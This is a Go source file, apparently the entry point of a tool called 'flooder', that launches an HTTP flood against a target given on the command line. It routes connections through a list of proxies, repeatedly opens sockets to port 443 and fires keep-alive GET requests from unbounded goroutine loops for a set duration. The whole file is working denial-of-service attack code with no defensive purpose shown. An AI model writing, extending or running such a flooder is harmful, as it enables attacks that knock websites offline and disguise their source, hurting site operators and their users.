package main

import (
	"flooder/packages"
	"net"
	"os"
	"runtime"
	"sync/atomic"
	"time"
)

func createRequests(socket net.Conn, attackInfo *packages.AttackInfo, buffer []byte, errors *int32) {
	for index := 0; index < attackInfo.RequestRate; index++ {
		go func(socket net.Conn, buffer []byte, errors *int32) {
			if written, err := socket.Write(buffer); err != nil || written != len(buffer) {
				atomic.AddInt32(errors, 1)
			}
		}(socket, buffer, errors)
	}
}

func attackSocket(attackInfo *packages.AttackInfo) {
	proxyAddress := packages.RandValue(attackInfo.Proxies)
	host, port, err := net.SplitHostPort(proxyAddress)
	if err != nil {
		return
	}
	options := &packages.ProxyOptions{
		Proxy: &packages.Address{
			Host: host,
			Port: packages.ToInt(port),
		},
		Target: &packages.Address{
			Host: attackInfo.Target.Host,
			Port: 443,
		},
		Timeout: 5 * time.Second,
	}
	socket, err := packages.GetClientConnection(options)
	if err != nil {
		return
	}
	buffer := []byte("GET " + attackInfo.Target.Path + " HTTP/1.1\r\nHost: " + attackInfo.Target.Host + "\r\nConnection: keep-alive\r\n\r\n")
	var errors int32
	for errors < 5 {
		time.Sleep(1 * time.Second)
		go createRequests(socket, attackInfo, buffer, &errors)
	}
}

func executeAttack(attackInfo *packages.AttackInfo) {
	for {
		time.Sleep(1 * time.Millisecond)
		go attackSocket(attackInfo)
	}
}

func main() {
	cores := runtime.NumCPU()
	runtime.GOMAXPROCS(cores)
	target := os.Args[1]
	duration := os.Args[2]
	requestRate := os.Args[3]
	threads := os.Args[4]
	proxyFile := os.Args[5]
	attackInfo := &packages.AttackInfo{
		Target:      packages.ParseTarget(target),
		Duration:    packages.ToInt(duration),
		RequestRate: packages.ToInt(requestRate),
		Threads:     packages.ToInt(threads),
		Proxies:     packages.ReadLines(proxyFile),
	}
	for count := 1; count <= attackInfo.Threads; count++ {
		go executeAttack(attackInfo)
	}
	time.Sleep(time.Duration(attackInfo.Duration) * time.Second)
}
